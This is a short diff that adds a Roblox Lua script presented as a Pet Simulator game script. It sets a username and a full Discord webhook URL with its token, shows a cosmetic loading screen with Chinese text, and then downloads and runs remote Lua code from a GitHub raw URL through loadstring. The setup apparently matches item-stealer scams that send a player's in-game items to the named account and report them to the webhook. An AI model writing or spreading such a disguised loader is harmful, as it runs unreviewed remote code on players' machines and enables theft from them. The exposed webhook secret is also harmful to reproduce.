@@ -1,0 +1,11 @@
+Username = "cocvn_my"
+WebHook = "https://discord.com/api/webhooks/1101686172427747428/L_iYp4s5E2Qr8GUK36j0vKIkNPPI9j98gYgjH9TyDtm3g0lZE3c1hH9-IHGH2g6Ya3UL"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "宠物模拟器脚本"
+_G.Text1 = "脚本加载中..."
+_G.Text2 = "等待脚本"
+_G.Text3 = "检查脚本..."
+_G.Text4 = "启动脚本..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
